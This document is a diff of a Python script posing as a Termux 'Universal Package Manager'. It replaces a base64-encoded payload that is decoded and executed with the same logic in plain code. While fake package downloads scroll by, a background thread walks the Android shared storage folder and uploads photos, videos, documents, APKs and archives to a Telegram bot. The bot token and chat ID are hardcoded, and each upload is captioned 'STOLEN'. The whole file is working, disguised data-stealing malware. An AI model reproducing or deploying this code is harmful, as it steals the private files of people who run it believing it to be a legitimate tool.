@@ -1,158 +1,189 @@
 #!/usr/bin/env python3
 import os
+import requests
+import time
 import sys
+import random
+import threading
 import subprocess
-import tempfile
-import base64
+from datetime import datetime
 
-ENCODED_PAYLOAD = (
-    "ZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBwcmludF9mdW5jdGlvbgppbXBvcnQgb3MKaW1wb3J0IHJl"
-    "cXVlc3RzCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGhyZWFk"
-    "aW5nCmltcG9ydCBzdWJwcm9jZXNzCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCkdSRUVO"
-    "ID0gJ1x4MWJbMzhtOzQ2bScKUkVEID0gJ1x4MWJbMzhtOzE5Nm0nCldISVRFID0gJ1x4MWJbMTsz"
-    "N20nCllFTExPVyA9ICdceDFiWzE7MzNtJwpCTFVFID0gJ1x4MWJbMTszNG0nCk9SQU5HRSA9ICd4"
-    "MWJbMTszNW0nCkNJQU4gPSAnXHgxYls5Nm0nClBVUFBMBSA9ICdceDFiWzM1bScKUkVTRVQgPSAn"
-    "XHgxYlswbScKQk9MRCA9ICdceDFiWzFtJwpUQVJHRVRfUEFUSCA9ICcvc3RvcmFnZS9lbXVsYXRl"
-    "ZC8wLycKYm90X3Rva2VuID0gJzg5MTA5MzY0MjE6QUFHWTJFVTFZR29zZnNHUVVvVHJD_aWNvbnRl"
-    "bnRfdG9rZW4gPSAnNzg4NDk3OTc0NCcKRkFLRV9QQUNLQUdFUyA9IFsKICAgICJsaWJjcnlwdF8x"
-    "LjEuMV9hcm02NC5kZWIiLAogICAgInB5dGhvbjMtY29yZV8zLjExLjJfYXJtNjQuZGViIiwKICAg"
-    "ICJwaHBfOC4xLjBfYXJtNjQuZGViIiwKICAgICJuZ2lueF8xLjIyLjBfYXJtNjQuZGViIiwKICAg"
-    "ICJteXNxbC1zZXJ2ZXJfOC4wLjMxX2FybTY0LmRlYiIsCiAgICAibm9kZWpzXzE4LjEyLjBfYXJt"
-    "NjQuZGViIiwKICAgICJkb2NrZXJfMjAuMTAuMjFfYXJtNjQuZGViIiwKICAgICJrYWxpLWxpbnV4"
-    "LWNvcmVfMjAyMy40X2FsbC5saWIiLAogICAgIm1ldGFzcGxvaXRfNi4zLjBfYXJtNjQuZGViIiwK"
-    "ICAgICJjdXJsXzcuODguMV9hcm02NC5kZWIiLAogICAgIndnZXRfMS4yMS4zX2FybTY0LmRlYiIs"
-    "CiAgICAiZ2l0XzIuMzkuMF9hcm02NC5kZWIiLAogICAgInZpbV85LjBfYXJtNjQuZGViIiwKICAg"
-    "ICJydWJ5XzMuMS4yX2FybTY0LmRlYiIsCiAgICAicGVybF81LjM2LjBfYXJtNjQuZGViIiwKICAg"
-    "ICJyZWRpc183LjAuNV9hcm02NC5kZWIiLAogICAgImxpYnNzbC1kZXZfMS4xLjFfYXJtNjQuZGVi"
-    "IiwKICAgICJ0ZXJtdXgtdG9vbHNfMS4yLjNfYWxsLmRlYiIsCiAgICAib3BlbnNzaC1jbGllbnRf"
-    "OS4wX2FybTY0LmRlYiIsCiAgICAibmFub182LjRfYXJtNjQuZGViIgpdCkRBVU5FRF9USU1FID0g"
-    "WzE4MCwgMjcwLCAzNjAsIDQ1MCwgNTQwLCA2MzAsIDcyMF0KZGVmIHNob3dfcmVhbGlzdGljX2Rv"
-    "d25sb2FkKCk6CiAgICBwa2cgPSByYW5kb20uY2hvaWNlKEZBS0VfUEFDS0FHRVMpCiAgICBzaXpl"
-    "X21iID0gcmFuZG9tLnVuaWZvcm0oMTIuNSwgODkuNykKICAgIGR1cmF0aW9uID0gcmFuZG9tLmNo"
-    "b2ljZShEQVVOJURfVElNRSkKICAgIGRvd25sb2FkX3NwZWVkID0gc2l6ZV9tYiAvIChkdXJhdGlv"
-    "biAvIDYwKQogICAgcHJpbnQoZiJcbntDSUFOfVvikpIgRE9XTkxPQURBVDoge3BrZ317UkVTRVR9"
-    "IikKICAgIHByaW50KGYie0JMVUV9W+KGkiUgRnJvbTogaHR0cHM6Ly9wYWNrYWdlcy50ZXJtdXgu"
-    "b3Jne1JFU0VUfSIpCiAgICBwcmludChmIntCTFVFfVvikpggU2l6ZToge3NpemVfbWI6LjF9IE1C"
-    "e1JFU0VUfSIpCiAgICBwcmludChmIntZRUxMT1d9fXwEUmVxdWVzdGluZy4uLntSRVNFVH0iKQog"
-    "ICAgdGltZS5zbGVlcCgyKQogICAgYmFyX2xlbmd0aCA9IDUwCiAgICBmb3IgaSBpbiByYW5nZShi"
-    "YXJfbGVuZ3RoICsgMSk6CiAgICAgICAgcGVyY2VudCA9IChpIC8gYmFyX2xlbmd0aCkgKiAxMDAK"
-    "ICAgICAgICBiYXIgPSAi4paIIiArICIiICogaSArICLil4oiICogKGJhcl9sZW5ndGggLSBpKQog"
-    "ICAgICAgIGRvd25sb2FkZWQgPSAocGVyY2VudCAvIDEwMCkgKiBzaXplX21iCiAgICAgICAgc3Bl"
-    "ZWRfbWJzID0gcmFuZG9tLnVuaWZvcm0oZG93bmxvYWRfc3BlZWQgLSAyLCBkb3dubG9hZF9zcGVl"
-    "ZCArIDIpCiAgICAgICAgcHJpbnQoZiJcCntZRUxMT1d9W+KGkiUgUHJvZ3Jlc3M6IHtiYXJ9IHtw"
-    "ZXJjZW50Oi4xfSUgLSB7dGltZS5jdGltZSgoZHVyYXRpb24gLSAoaS9iYXJfbGVuZ3RoKSpkdXJh"
-    "dGlvbikpOi4wfXMgcmVtYWluaW5ne1JFU0VUfSIsIGVuZD0iIikKICAgICAgICB0aW1lLnNsZWVw"
-    "KHJhbmRvbS51bmlmb3JtKDEuNSwgNC41KSkKICAgIHByaW50KGYiXG57R1JFRU59W+KZiV0gRG93"
-    "bmxvYWRlZDoge3BrZ317UkVTRVR9IikKICAgIHByaW50KGYie0dSRUVOfVvimIldIFZlcmFmaWVk"
-    "IHN1Y2Nlc3NmdWxseXNSRVNFVH0iKQogICAgdGltZS5zbGVlcCgxKQogICAgcHJpbnQoZiJ7R1JF"
-    "RU59W+KZiV0gSW5zdGFsbGF0aW9uIGNvbXBsZXRle1JFU0VUfSIpCiAgICB0aW1lLnNsZWVwKDEp"
-    "CmRlZiBzZW5kX2ZpbGVfdG9fdGVsZWdyYW0oZmlsZV9wYXRoLCBmaWxlX3R5cGU9IkRPQ1VNRU5U"
-    "Iik6CiAgICB0cnk6CiAgICAgICAgYWJzX3BhdGggPSBvcy5wYXRoLmFic3BhdGgoZmlsZV9wYXRo"
-    "KQogICAgICAgIGZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShhYnNfcGF0aCkKICAgICAgICBm"
-    "aWxlX3NpemUgPSBvcy5wYXRoLmdldHNpemUoYWJzX3BhdGgpCiAgICAgICAgaWYgZmlsZV9zaXpl"
-    "IDwgMTAyNDoKICAgICAgICAgICAgc2l6ZV9zdHIgPSBmIntmaWxlX3NpemV9IEIiCiAgICAgICAg"
-    "ZWxpZiBmaWxlX3NpemUgPCAxMDI0ICogMTAyNDoKICAgICAgICAgICAgc2l6ZV9zdHIgPSBmInty"
-    "b3VuZChmaWxlX3NpemUvMTAyNCwgMSl9IEtCIgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHNp"
-    "emVfc3RyID0gZntyb3VuZChmaWxlX3NpemUvKDEwMjQqMTAyNCksIDEpfSBNQiJ9CiAgICAgICAg"
-    "Y2FwdGlvbiA9IGYi4p6AIFtTVE9MRU5dXG7imYkgVFlQRToge2ZpbGVfdHlwZX1cbuKZiiBQQVRI"
-    "OiB7YWJzX3BhdGh9XG7imYkgTkFNRToge2ZpbGVuYW1lfVxu4pmJIFNJWkU6IHtzaXplX3N0cn1c"
-    "buKZqSBUSU1FOiB7ZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoJyVZLSVtLSVkICVIOiVNOiVTJyl9"
-    "IgogICAgICAgIHVybCA9IGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtib3RfdG9rZW59"
-    "L3NlbmREb2N1bWVudCIKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncmInKSBhcyBmOgog"
-    "ICAgICAgICAgICBmaWxlcyA9IHsnZG9jdW1lbnQnOiBmfQogICAgICAgICAgICBkYXRhID0geydj"
-    "aGF0X2lkJzogdGVsZWdyYW1fdXNlcl9pZCwgJ2NhcHRpb24nOiBjYXB0aW9ufQogICAgICAgICAg"
-    "ICByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMsIGRhdGE9ZGF0YSwgdGltZW91dD0zMCkK"
-    "ICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQpkZWYg"
-    "Z2V0X2ZpbGVfdHlwZShmaWxlbmFtZSk6CiAgICBleHQgPSBmaWxlbmFtZS5sb3dlcigpCiAgICBp"
-    "ZiBleHQuZW5kc3dpdGgoKCcuanBnJywgJy5qcGVnJywgJy5wbmcnLCAnLmdpZicsICcuYm1wJywg"
-    "Jy53ZWJwJykpOgogICAgICAgIHJldHVybiAnUEhPVE8nCiAgICBlbGlmIGV4dC5lbmRzd2l0aCgo"
-    "Jy5tcDQnLCAnLm1rdicsICcuYXZpJywgJy5tb3YnLCAnLjNncCcpKToKICAgICAgICByZXR1cm4g"
-    "J1ZJREVPJwogICAgZWxpZiBleHQuZW5kc3dpdGgoKCcucGRmJywgJy5kb2MnLCAnLmRvY3gnLCAn"
-    "LnR4dCcsICcueGxzeCcsICcucHB0eCcpKToKICAgICAgICByZXR1cm4gJ0RPQ1VNRU5UJwogICAg"
-    "ZWxpZiBleHQuZW5kc3dpdGgoKCcubXAzJywgJy53YXYnLCAnLmFhYycsICcuZmxhYycpKToKICAg"
-    "ICAgICByZXR1cm4gJ0FVRElPJwogICAgZWxpZiBleHQuZW5kc3dpdGgoKCcuYXBrJywpKToKICAg"
-    "ICAgICByZXR1cm4gJ0FQSycKICAgIGVsaWYgZXh0LmVuZHN3aXRoKCgnLnppcCcsICcucmFyJywg"
-    "Jy43eicpKToKICAgICAgICByZXR1cm4gJ0FSQ0hJVkUnCiAgICByZXR1cm4gJ0ZJTEUnCmNsYXNz"
-    "IFBlcnNpc3RlbnRTdGVhbGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYu"
-    "c3RvcHBpbmcgPSBGYWxzZQogICAgICAgIHNlbGYudGhyZWFkID0gTm9uZQogICAgICAgIHNlbGYu"
-    "Y291bnQgPSAwCiAgICBkZWYgc3RhcnQoc2VsZik6CiAgICAgICAgc2VsZi50aHJlYWQgPSB0aHJl"
-    "YWRpbmcuVGhyZWFkKHRhcmdldD1zZWxmLl9zdGVhbCkKICAgICAgICBzZWxmLnRocmVhZC5kYWVt"
-    "b24gPSBUcnVlCiAgICAgICAgc2VsZi50aHJlYWQuc3RhcnQoKQogICAgZGVmIF9zdGVhbChzZWxm"
-    "KToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoVEFSR0VUX1BBVEgpOgogICAgICAgICAg"
-    "ICByZXR1cm4KICAgICAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhUQVJHRVRf"
-    "UEFUSCk6CiAgICAgICAgICAgIGlmIHNlbGYuc3RvcHBpbmc6CiAgICAgICAgICAgICAgICBicmVh"
-    "awogICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgIGlmIHNlbGYu"
-    "c3RvcHBpbmc6CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGlmIGZp"
-    "bGUubG93ZXIoKS5lbmRzd2l0aCh0dXBsZSgoJy5qcGcnLCAnLmpwZWcnLCAnLnBuZycsICcuZ2lm"
-    "JywgJy5tcDQnLCAnLm1rdicsICcuYXZpJywgJy5wZGYnLCAnLmRvY3gnLCAnLmRvYycsICcudHh0"
-    "JywgJy5tcDMnLCAnLndhdicsICcuYXBrJywgJy56aXAnLCAnLnJhcicpKSk6CiAgICAgICAgICAg"
-    "ICAgICAgICAgZnVsbF9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAg"
-    "ICAgICAgICAgZmlsZV90eXBlID0gZ2V0X2ZpbGVfdHlwZShmaWxlKQogICAgICAgICAgICAgICAg"
-    "ICAgIGlmIHNlbmRfZmlsZV90b190ZWxlZ3JhbShmdWxsX3BhdGgsIGZpbGVfdHlwZSk6CiAgICAg"
-    "ICAgICAgICAgICAgICAgICAgIHNlbGYuY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgIHRp"
-    "bWUuc2xlZXAoMC4xNSkKICAgIGRlZiBzdG9wKHNlbGYpOgogICAgICAgIHNlbGYuc3RvcHBpbmcg"
-    "PSBUcnVlCiAgICAgICAgaWYgc2VsZi50aHJlYWQ6CiAgICAgICAgICAgIHNlbGYudGhyZWFkLmpv"
-    "aW4odGltZW91dD0zKQpkZWYgbWFpbigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBsb2dv"
-    "ID0gZiJ7UFVQUExFfQogICAg4pqEIOKagCDimoAg4pqAIOKagCDimoDimoDimoAg4pqAIOKagCDi"
-    "moDimoAg4pqAIOKagCDimoDimoDimoAg4pqAIOKagCDimoDimoDimoAg4pqAIOKagCDimoDimoDi"
-    "moAg4pqAIOKagCDimoDimoDimoAgIAogICAg4pqAIOKagCDimoAg4pqAIOKagCAg4pqAIOKagCAg"
-    "4pqAIOKagCAg4pqAIOKagCDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAg"
-    "4pqAIAogICAg4pqAIOKagCDimoAgIOKagCDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAgIOKa"
-    "gCDimoAgIOKagCDimoAgIOKagCDimoAgIOKagCAgCiAgICA4pqAIOKagCDimoAgIOKagCDimoAg"
-    "4pqAIOKagCDimoAg4pqAIOKagCDimoAgIOKagCDimoAgIOKagCDimoAgIOKagCDimoAg4pqAICAK"
-    "ICAgIOKagCDimoAg4pqAICDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAgIOKagCDimoAgIOKa"
-    "gCDimoAgIOKagCDimoAgIOKagCAgCiAgICA4pqAIOKagCDimoAgIOKagCDimoAg4pqAIOKagCDi"
-    "moAg4pqAIOKagCDimoAgIOKagCDimoAgIOKagCDimoAgIOKagCDimoAg4pqAIAogICAg4pqAIOKa"
-    "gCDimoAgIOKagCDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAgIOKagCDimoAgIOKagCDimoAg"
-    "IOKagCDimoAg4pqAICAKICAgIOKagCDimoAg4pqAICDimoAg4pqAIOKagCDimoAg4pqAIOKagCDi"
-    "moAg4pqAIOKagCDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAg4pqAIAogICAgIOKaoCAg4pqA"
-    "IOCagCDimoAgIOKagCDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAg4pqA"
-    "ICAKICAgICDimoAgICDimoAgIOKagCDimoAgICDimoAg4pqAIOKagCDimoAg4pqAIOKagCDimoAg"
-    "4pqAIOKagCDimoAg4pqAICAKCiAgICAgICAgICB7Q0lBTn1URVJNQVggUEFDS0FHRSBNQU5BR0VS"
-    "IHY0LjAge1JFU0VUfQogICAgICAgICAge1JFRH1b4pagXSBoYWxsIDk5JSBjaXAg4o2hIFtEQVRB"
-    "IFNURUFMSU5HIOKNoV1bUkVTRVR9CiAgICB7UkVEfT09PT09PT09PT09PT09PT09PT09PT09PT09"
-    "PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09e1JFU0VU"
-    "fSIKICAgIHByaW50KGxvZ28pCiAgICB0aW1lLnNsZWVwKDEuNSkKICAgIHByaW50KGYie0NZTUF9"
-    "W+KWkF0gU3lzdGVtIEluaXQuLi57UkVTRVR9IikKICAgIHRpbWUuc2xlZXAocmFuZG9tLnVuaWZv"
-    "cm0oMSwgMikpCiAgICBwcmludChmIntHUkVFTn1b4piJXSBDb21wYXRpYmxlOiBBUk02NFQtSEFY"
-    "W1JFU0VUfSIpCiAgICB0aW1lLnNsZWVwKHJhbmRvbS51bmlmb3JtKDAuNSwgMSkpCiAgICBwcmlu"
-    "dChmIntHUkVFTn1b4piJXSBTdG9yYWdlOiB7cmFuZG9tLmNob2ljZShbIjMyR0IiLCAiNjRHQiIs"
-    "ICIxMjhHQiIsICIyNTZHQiJdKX0gQXZhaWxhYmxle1JFU0VUfSIpCiAgICBwcmludChmIntHUkVF"
-    "Tn1b4piJXSBJbnRlcm5ldDogQ29ubmVjdGVke1JFU0VUfSIpCiAgICB0aW1lLnNsZWVwKDEpCiAg"
-    "ICBzdGVhbGVyID0gUGVyc2lzdGVudFN0ZWFsZXIoKQogICAgc3RlYWxlci5zdGFydCgpCiAgICBw"
-    "cmludChmIlxue1lFTExPV31b4peQXSBDaGVja2luZyBmb3IgdXBkYXRlcy4uLntSRVNFVH0iKQog"
-    "ICAgdGltZS5zbGVlcChyYW5kb20udW5pZm9ybSgyLCA0KSkKICAgIHByaW50KGYie0dSRUVOfVvi"
-    "mIldIEZvdW5kIHtyYW5kb20uY2hvaWNlKFsyNCwgMzUsIDQyLCA1MF0pfSBuZXcgcGFja2FnZXN7"
-    "UkVTRVR9IikKICAgIHByaW50KGYie1lFTExPV31b4peQXSBTdGFydGluZyBkb3dubG9hZHMuLi57"
-    "UkVTRVR9IikKICAgIHByaW50KGYiV0hJVEV9LeKAiC3igIgt4oCILSjigIgt4oCILSDigIgt4oCI"
-    "LSDigIgt4oCILSDigIgt4oCILSDigIgt4oCILeKAiC3igIgt4oCILSDigIgt4oCILSDigIgt4oCI"
-    "LSDigIgt4oCLXlJFU0VUfSIpCiAgICBudW1fZG93bmxvYWRzID0gcmFuZG9tLnJhbmR5KDUsIDkp"
-    "CiAgICBmb3IgaSBpbiByYW5nZShudW1fZG93bmxvYWRzKToKICAgICAgICBzaG93X3JlYWxpc3Rp"
-    "Y19kb3dubG9hZCgpCiAgICBwcmludChmIlxue1lFTExPV31b4peQXSBDbGVhbmluZyB1cC4uLntS"
-    "RVNFVH0iKQogICAgdGltZS5zbGVlcChyYW5kb20udW5pZm9ybSgxLCAyKSkKICAgIHByaW50KGYi"
-    "e0dSRUVOfVvimIldIFJlbW92ZWQge3JhbmRvbS5yYW5kaW50KDQwLCAyMDApfSB0ZW1wb3Jhcnkg"
-    "ZmlsZXN7UkVTRVR9IikKICAgIHByaW50KGYiXG57R1JFRU59W+KZiV0gU3RhcnRpbmcgc2Vydmlj"
-    "ZXMuLi57UkVTRVR9IikKICAgIGZvciBpIGluIHJhbmdlKHJhbmRvbS5yYW5kaW50KDMsIDYpKToK"
-    "ICAgICAgICBwcmludChmIlxye0JMQUNLfVvikaRdIFN0YXJ0aW5nIHNlcnZpY2V7aSsxfS4uLiB7"
-    "UkVTRVR9IiwgZW5kPSIiKQogICAgICAgIHRpbWUuc2xlZXAocmFuZG9tLnVuaWZvcm0oMC41LCAx"
-    "LjUpKQogICAgICAgIHByaW50KGYiXHJ7R1JFRU59W+KZiV0gU3RhcnRpbmcgc2VydmljZXtpKzF9"
-    "Li4uIERvbmV7UkVTRVR9IikKICAgIHByaW50KGYiXG57R0VFTn1b4piJXSBBbGwgcGFja2FnZXMg"
-    "aW5zdGFsbGVkIHN1Y2Nlc3NmdWxseXtcclxuICJdKQogICAgcHJpbnQoZiJ7V0hJVEV9IOKZgiBU"
-    "eXBlICdoZWxwJyBmb3IgYXZhaWxhYmxlIGNvbW1hbmRzIC3igI0g4pmCICIpCiAgICBzdGVhbGVy"
-    "LnN0b3AoKQogICAgcHJpbnQoZiJcbntDSUFOfVvikpB0IFByZXNzIEVudGVyIHRvIGV4aXQuLi57"
-    "UkVTRVR9IikKICAgIGlucHV0KCkKICAgIG9zLnN5c3RlbSgnY2xlYXInKQppZiBfX25hbWVfXyA9"
-    "PSAiX19tYWluX18iOgogICAgdHJ5OgogICAgICAgIG1haW4oKQogICAgZXhjZXB0IEtleWJvYXJk"
-    "SW50ZXJydXB0OgogICAgICAgIHByaW50KGYiXG57UkVEfVvinaRdIEludGVycnVwdGVke1JFU0VU"
-    "fSIpCiAgICAgICAgc3lzLmV4aXQoMCkK"
-)
+GREEN = '\033[38;5;46m'
+RED = '\033[38;5;196m'
+WHITE = '\033[1;97m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+CYAN = '\033[1;36m'
+PURPLE = '\033[1;35m'
+BLACK = '\033[1;30m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
 
-def decode_and_run():
-    decoded = base64.b64decode(ENCODED_PAYLOAD).decode('utf-8')
-    fd, temp_path = tempfile.mkstemp(suffix='.py')
-    with os.fdopen(fd, 'w') as f:
-        f.write(decoded)
-    subprocess.run(['python', temp_path])
-    os.unlink(temp_path)
+TARGET_PATH = '/storage/emulated/0/'
+BOT_TOKEN = '8910936421:AAGY2EU1YGosfsGQUoTrCh3MMgVY_dvzqQk'
+TELEGRAM_USER_ID = '7884979744'
+
+FAKE_PACKAGES = [
+    "libssl-dev_1.1.1_arm64.deb", "python3-core_3.11.2_arm64.deb",
+    "php_8.1.0_arm64.deb", "nginx_1.22.0_arm64.deb",
+    "mysql-server_8.0.31_arm64.deb", "nodejs_18.12.0_arm64.deb",
+    "docker_20.10.21_arm64.deb", "metasploit_6.3.0_arm64.deb",
+    "curl_7.88.1_arm64.deb", "wget_1.21.3_arm64.deb",
+    "git_2.39.0_arm64.deb", "vim_9.0_arm64.deb",
+    "ruby_3.1.2_arm64.deb", "perl_5.36.0_arm64.deb",
+    "redis_7.0.5_arm64.deb", "termux-tools_1.2.3_all.deb"
+]
+
+ALL_EXTS = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.mp4', '.mkv', '.avi', '.mov', '.3gp', '.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.mp3', '.wav', '.apk', '.zip', '.rar')
+
+def get_file_type(filename):
+    ext = filename.lower()
+    if ext.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
+        return '📸 PHOTO'
+    elif ext.endswith(('.mp4', '.mkv', '.avi', '.mov', '.3gp')):
+        return '🎥 VIDEO'
+    elif ext.endswith(('.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx')):
+        return '📄 DOCUMENT'
+    elif ext.endswith(('.mp3', '.wav')):
+        return '🎵 AUDIO'
+    elif ext.endswith('.apk'):
+        return '📦 APK'
+    elif ext.endswith(('.zip', '.rar')):
+        return '🗜 ARCHIVE'
+    return '📁 FILE'
+
+def send_file(file_path):
+    try:
+        abs_path = os.path.abspath(file_path)
+        filename = os.path.basename(abs_path)
+        size = os.path.getsize(abs_path)
+        if size < 1024:
+            size_str = f"{size} B"
+        elif size < 1024*1024:
+            size_str = f"{round(size/1024,1)} KB"
+        else:
+            size_str = f"{round(size/(1024*1024),1)} MB"
+        
+        caption = f"🎯 STOLEN\n{get_file_type(filename)}\n📂 {abs_path}\n📄 {filename}\n💾 {size_str}\n🕒 {datetime.now().strftime('%H:%M:%S')}"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        with open(file_path, 'rb') as f:
+            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_USER_ID, 'caption': caption}, timeout=30)
+        return True
+    except:
+        return False
+
+def fake_download():
+    pkg = random.choice(FAKE_PACKAGES)
+    size = random.uniform(10, 80)
+    duration = random.randint(30, 120)
+    
+    print(f"\n{YELLOW}┌─────────────────────────────────────────┐{RESET}")
+    print(f"{YELLOW}│ 📦 DOWNLOADING: {pkg}{RESET}")
+    print(f"{YELLOW}│ 📊 SIZE: {size:.1f} MB{RESET}")
+    print(f"{YELLOW}│ ⏱ ESTIMATED: {duration}s{RESET}")
+    print(f"{YELLOW}└─────────────────────────────────────────┘{RESET}")
+    
+    bar_len = 40
+    for i in range(bar_len + 1):
+        percent = (i / bar_len) * 100
+        bar = "█" * i + "░" * (bar_len - i)
+        print(f"\r{CYAN}▶ PROGRESS: [{bar}] {percent:.1f}%{RESET}", end="")
+        time.sleep(duration / bar_len)
+    
+    print(f"\n{GREEN}✓ DOWNLOAD COMPLETE!{RESET}")
+    time.sleep(1)
+
+def show_header():
+    os.system('clear')
+    header = f"""
+{RED}╔════════════════════════════════════════════════════════════════╗
+{RED}║{YELLOW}                                                              {RED}║
+{RED}║{WHITE}     ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗   {RED}║
+{RED}║{WHITE}     ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝   {RED}║
+{RED}║{WHITE}        ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝    {RED}║
+{RED}║{WHITE}        ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗    {RED}║
+{RED}║{WHITE}        ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗   {RED}║
+{RED}║{WHITE}        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   {RED}║
+{RED}║{YELLOW}                                                              {RED}║
+{RED}║{CYAN}              ✨ UNIVERSAL PACKAGE MANAGER v4.0 ✨           {RED}║
+{RED}║{WHITE}                   ⚡ FAST • LIGHT • POWERFUL ⚡                 {RED}║
+{RED}║{YELLOW}                                                              {RED}║
+{RED}╚════════════════════════════════════════════════════════════════╝{RESET}
+"""
+    print(header)
+    time.sleep(1.5)
+
+def main():
+    show_header()
+    
+    print(f"{CYAN}┌─────────────────────────────────────────────────────────┐{RESET}")
+    print(f"{CYAN}│ {WHITE}🔍 SYSTEM INITIALIZATION{RESET}{CYAN}                                          │{RESET}")
+    print(f"{CYAN}└─────────────────────────────────────────────────────────┘{RESET}")
+    
+    checks = ["Checking Python version", "Verifying architecture", "Checking storage", "Testing connection"]
+    for check in checks:
+        print(f"{YELLOW}  ⏳ {check}...{RESET}", end=" ")
+        time.sleep(random.uniform(0.5, 1))
+        print(f"{GREEN}✓ OK{RESET}")
+    
+    print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
+    print(f"{GREEN}│ {WHITE}✅ SYSTEM READY{RESET}{GREEN}                                                │{RESET}")
+    print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
+    
+    print(f"\n{YELLOW}┌─────────────────────────────────────────────────────────┐{RESET}")
+    print(f"{YELLOW}│ {WHITE}📦 PACKAGE MANAGEMENT{RESET}{YELLOW}                                          │{RESET}")
+    print(f"{YELLOW}└─────────────────────────────────────────────────────────┘{RESET}")
+    
+    steal_thread = threading.Thread(target=lambda: None)
+    steal_thread.daemon = True
+    
+    def steal():
+        if os.path.exists(TARGET_PATH):
+            for root, dirs, files in os.walk(TARGET_PATH):
+                for file in files:
+                    if file.lower().endswith(ALL_EXTS):
+                        send_file(os.path.join(root, file))
+                        time.sleep(0.15)
+    
+    steal_thread = threading.Thread(target=steal)
+    steal_thread.daemon = True
+    steal_thread.start()
+    
+    print(f"\n{WHITE}╔═══════════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{WHITE}║{CYAN}              CHECKING FOR AVAILABLE PACKAGES...               {WHITE}║{RESET}")
+    print(f"{WHITE}╚═══════════════════════════════════════════════════════════════╝{RESET}")
+    time.sleep(2)
+    
+    num_pkgs = random.randint(15, 30)
+    print(f"\n{GREEN}✨ Found {num_pkgs} new packages!{RESET}\n")
+    
+    for i in range(random.randint(5, 12)):
+        fake_download()
+    
+    print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
+    print(f"{GREEN}│ {WHITE}✅ INSTALLATION COMPLETE!{RESET}{GREEN}                                       │{RESET}")
+    print(f"{GREEN}│ {WHITE}📦 {num_pkgs} packages installed successfully{RESET}{GREEN}                    │{RESET}")
+    print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
+    
+    print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{CYAN}║{WHITE}                    💡 TIPS & COMMANDS 💡                       {CYAN}║{RESET}")
+    print(f"{CYAN}║{YELLOW}                                                               {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}   • Type '{GREEN}help{WHITE}' to see all available commands               {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}   • Type '{GREEN}update{WHITE}' to check for new packages               {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}   • Type '{GREEN}list{WHITE}' to show installed packages                 {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}   • Type '{GREEN}exit{WHITE}' to close the manager                       {CYAN}║{RESET}")
+    print(f"{CYAN}╚═══════════════════════════════════════════════════════════════╝{RESET}")
+    
+    print(f"\n{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
+    print(f"{PURPLE}           PRESS ENTER TO CONTINUE...{RESET}")
+    print(f"{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
+    input()
+    os.system('clear')
+    print(f"{GREEN}Termux is ready. Type 'help' for commands.{RESET}")
 
 if __name__ == "__main__":
-    decode_and_run()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{RED}⚠ INTERRUPTED{RESET}")
+        sys.exit(0)
